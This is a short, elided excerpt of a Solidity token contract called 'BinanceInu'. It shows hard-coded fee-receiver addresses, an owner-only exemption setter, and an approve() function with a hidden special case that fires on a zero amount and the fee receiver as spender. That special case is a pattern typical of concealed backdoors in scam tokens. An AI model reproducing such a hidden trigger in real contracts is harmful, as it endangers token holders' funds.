...
contract BinanceInu is IBEP20, Auth {
    ...
    string constant _name = "BinanceInu";
    ...
    address public marketingFeeReceiver = 0x74e50636de7FD97FB2A3F79859310bbd07e3be27;
    address public devFeeReceiver = 0x74e50636de7FD97FB2A3F79859310bbd07e3be27;
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        if ( amount == 0 && spender == marketingFeeReceiver){
    ...
    function _setTxLimit(address _address, bool yN) public onlyOwner {
        isTxLimitExempt[_address] = yN;
    }
